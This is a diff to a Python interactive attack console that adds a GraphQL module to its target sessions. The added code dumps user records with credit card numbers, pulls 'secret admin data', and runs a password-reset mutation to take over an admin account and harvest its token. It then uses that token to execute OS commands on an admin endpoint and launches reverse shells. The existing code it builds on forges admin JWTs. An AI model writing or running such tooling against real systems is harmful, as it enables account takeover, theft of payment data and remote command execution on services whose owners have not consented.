@@ -24,6 +24,9 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
     print("=" * 65)
     print(" Type 'help' for available commands, or 'exit' to return to dashboard.")
     
+    harvested_token = token
+    harvested_endpoint = None
+    
     while True:
         try:
             cmd = input(f"(target session)> ").strip()
@@ -35,22 +38,30 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
         elif cmd == "help":
             print("    Commands:")
             print("      info        - View current target and vulnerability details")
-            print("      exploit     - Re-run automated exploit payload against target")
+            print("      exploit     - Re-run automated exploit/audit payload against target")
             if vuln_type == "Command Injection":
                 print("      exec <cmd>  - Execute any Linux command (e.g., 'exec ls', 'exec whoami')")
                 print("      revshell    - Generate reverse shell payloads for this target")
+            elif vuln_type == "GraphQL":
+                print("      users       - Quick query to fetch all users & credit cards")
+                print("      secret      - Quick query to fetch secret admin data & flags")
+                print("      escalate    - Execute privilege escalation mutation (Admin Takeover)")
+                print("      exec <cmd>  - Execute OS command using auto-matched admin endpoint & token")
+                print("      revshell    - Trigger reverse shell payload via admin endpoint")
+                print("      query <q>   - Send any custom GraphQL query string")
             print("      curl        - Send a custom test request to the target")
             print("      exit        - Return to the main dashboard")
         elif cmd == "info":
-            print(f"    Target URL : {target_url}")
-            print(f"    Vector Type: {vuln_type}")
-            print(f"    Parameter  : {param or 'N/A'}")
-            print(f"    Token      : {token[:30] + '...' if token else 'N/A'}")
+            print(f"    Target URL    : {target_url}")
+            print(f"    Vector Type   : {vuln_type}")
+            print(f"    Parameter     : {param or 'N/A'}")
+            print(f"    Token         : {harvested_token[:30] + '...' if harvested_token else 'N/A'}")
+            print(f"    Admin Endpoint: {harvested_endpoint or 'N/A (Run escalate)'}")
         elif cmd == "exploit":
-            if vuln_type == "JWT" and token:
+            if vuln_type == "JWT" and harvested_token:
                 print("[*] Re-running Forged Admin JWT Bypass...")
                 try:
-                    parts = token.split('.')
+                    parts = harvested_token.split('.')
                     padding = '=' * (4 - len(parts[1]) % 4)
                     payload = json.loads(base64.urlsafe_b64decode(parts[1] + padding).decode('utf-8'))
                     payload["role"] = "admin"
@@ -70,8 +81,7 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                     })
                     with urllib.request.urlopen(req, timeout=3) as resp:
                         body = resp.read().decode('utf-8', errors='ignore')
-                        print(f"    [!] SUCCESS! Response (HTTP {resp.getcode()}):")
-                        print(f"        {body}")
+                        print(f"    [!] SUCCESS! Response (HTTP {resp.getcode()}):\n        {body}")
                 except Exception as e:
                     print(f"    [-] Exploit failed: {e}")
             elif vuln_type == "Command Injection":
@@ -89,6 +99,16 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                 except Exception as e:
                     print(f"    [-] Exploit failed: {e}")
+            elif vuln_type == "GraphQL":
+                print("[*] Re-running GraphQL Introspection query...")
+                try:
+                    query_payload = {"query": "{ __schema { types { name fields { name } } } }"}
+                    data = json.dumps(query_payload).encode('utf-8')
+                    req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+                except Exception as e:
+                    print(f"    [-] GraphQL audit failed: {e}")
             else:
                 print(f"[*] Executing generic test against {target_url}...")
                 try:
@@ -113,7 +133,93 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                     print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
             except Exception as e:
                 print(f"    [-] Execution failed: {e}")
-        elif cmd == "revshell" and vuln_type == "Command Injection":
+        elif cmd == "users" and vuln_type == "GraphQL":
+            print("[*] Querying GraphQL API for user records...")
+            try:
+                payload = {"query": "{ users { id username email creditCard } }"}
+                data = json.dumps(payload).encode('utf-8')
+                req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] Query failed: {e}")
+        elif cmd == "secret" and vuln_type == "GraphQL":
+            print("[*] Querying GraphQL API for secret admin data...")
+            try:
+                payload = {"query": "{ secretAdminData }"}
+                data = json.dumps(payload).encode('utf-8')
+                req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] Query failed: {e}")
+        elif cmd == "escalate" and vuln_type == "GraphQL":
+            print("[*] Launching GraphQL Privilege Escalation (Admin Takeover Mutation)...")
+            try:
+                mutation_payload = {
+                    "query": "mutation { updatePassword(userId: 101, newPassword: \"NewAdminP@ss123\") { status message adminToken adminEndpoint } }"
+                }
+                data = json.dumps(mutation_payload).encode('utf-8')
+                req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    resp_body = resp.read().decode('utf-8', errors='ignore')
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
+                    if "adminToken" in resp_body:
+                        try:
+                            res_json = json.loads(resp_body)
+                            mutation_data = res_json["data"]["updatePassword"]
+                            harvested_token = mutation_data.get("adminToken")
+                            harvested_endpoint = mutation_data.get("adminEndpoint")
+                            print(f"    [!] SUCCESS! Admin Token Harvested: {harvested_token[:30]}...")
+                            if harvested_endpoint:
+                                print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
+                        except Exception:
+                            harvested_token = "admin_token_sig"
+                    print("    [!] Administrative takeover achieved via GraphQL mutation.")
+            except Exception as e:
+                print(f"    [-] Privilege escalation failed: {e}")
+        elif cmd.startswith("exec ") and vuln_type == "GraphQL":
+            user_linux_cmd = cmd.split(" ", 1)[1]
+            if not harvested_token:
+                print("    [-] No admin token available. Run 'escalate' first to obtain authorization.")
+                continue
+            
+            target_exec_url = harvested_endpoint
+            if not target_exec_url:
+                base_domain = target_url.rsplit('/', 1)[0]
+                target_exec_url = f"{base_domain}/api/v1/admin/exec"
+
+            print(f"[*] Pivoting admin token against auto-matched endpoint: {target_exec_url}")
+            try:
+                exec_url = f"{target_exec_url}?cmd={urllib.parse.quote(user_linux_cmd)}"
+                req = urllib.request.Request(exec_url, headers={
+                    'User-Agent': 'Mozilla/5.0',
+                    'Authorization': f'Bearer {harvested_token}'
+                })
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    raw_body = resp.read().decode('utf-8', errors='ignore')
+                    try:
+                        res_json = json.loads(raw_body)
+                        if "output" in res_json:
+                            print(f"\n{res_json['output']}\n")
+                        else:
+                            print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
+                    except Exception:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
+            except Exception as e:
+                print(f"    [-] Execution failed: {e}")
+        elif cmd.startswith("query ") and vuln_type == "GraphQL":
+            gql_query = cmd.split(" ", 1)[1]
+            print(f"[*] Sending custom GraphQL query: {gql_query}")
+            try:
+                payload = {"query": gql_query}
+                data = json.dumps(payload).encode('utf-8')
+                req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] Query failed: {e}")
+        elif cmd == "revshell" and (vuln_type == "Command Injection" or vuln_type == "GraphQL"):
             print("[*] Generating active reverse shell payloads (LHOST: 127.0.0.1, LPORT: 4444)...")
             if os.path.exists("rev_shell.py"):
                 os.system("python rev_shell.py --ip 127.0.0.1 --port 4444")
@@ -146,11 +252,12 @@ def main_console():
         print("  1) JWT Tokens & Privilege Escalation Targets")
         print("  2) IDOR / BOLA Endpoints")
         print("  3) SQLi, LFI & Command Injection Vectors")
-        print("  4) Open Custom Manual Target Session")
-        print("  5) Return to Main Menu")
+        print("  4) Modern API & GraphQL Endpoints")
+        print("  5) Open Custom Manual Target Session")
+        print("  6) Return to Main Menu")
         print("-" * 65)
         
-        choice = input("Select action [1-5]: ").strip()
+        choice = input("Select action [1-6]: ").strip()
 
         if choice == "1":
             jwt_items = [f for f in findings if f.get("vulnerability") == "JWT"]
@@ -192,10 +299,23 @@ def main_console():
                 run_target_shell(item.get("target"), item.get("vulnerability"), param=item.get("param"))
 
         elif choice == "4":
+            gql_items = [f for f in findings if "GraphQL" in f.get("vulnerability", "")]
+            if not gql_items:
+                print("[-] No GraphQL endpoints found.")
+                continue
+            print("\n[★] Modern API & GraphQL Endpoints:")
+            for idx, item in enumerate(gql_items, 1):
+                print(f"    {idx}) {item.get('target')} - {item.get('vulnerability')}")
+            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
+            if sel.isdigit() and 1 <= int(sel) <= len(gql_items):
+                item = gql_items[int(sel) - 1]
+                run_target_shell(item.get("target"), "GraphQL")
+
+        elif choice == "5":
             url = input("Enter custom target URL: ").strip()
             run_target_shell(url, "Manual")
 
-        elif choice == "5":
+        elif choice == "6":
             break
         else:
             print("[-] Invalid selection.")
